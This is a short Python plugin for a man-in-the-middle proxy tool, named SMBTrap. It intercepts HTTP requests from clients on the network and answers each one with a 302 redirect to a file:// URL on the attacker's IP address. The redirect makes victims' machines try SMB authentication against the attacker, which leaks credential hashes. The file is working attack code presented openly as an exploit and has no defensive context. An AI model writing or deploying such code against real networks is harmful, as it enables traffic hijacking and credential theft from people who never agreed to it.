import random
import string
from libmproxy.protocol.http import HTTPResponse
from plugins.plugin import Plugin
from netlib.odict import ODictCaseless

class SMBTrap(Plugin):
    name = 'SMBTrap'
    optname = 'smbtrap'
    desc = "Exploits the SMBTrap vulnerability on connected clients"
    version = "1.0"

    def request(self, context, flow):
        rand_name = ''.join(random.sample(string.ascii_lowercase + string.ascii_uppercase, 10))
        resp = HTTPResponse(
            [1, 1], 302, "OK",
            ODictCaseless([["Location", "file://{}/{}".format(context.ip, rand_name)]]),
            "Trapped!")

        context.log("[SMBTrap] Trapped request to: {}".format(flow.request.host))
        flow.reply(resp)
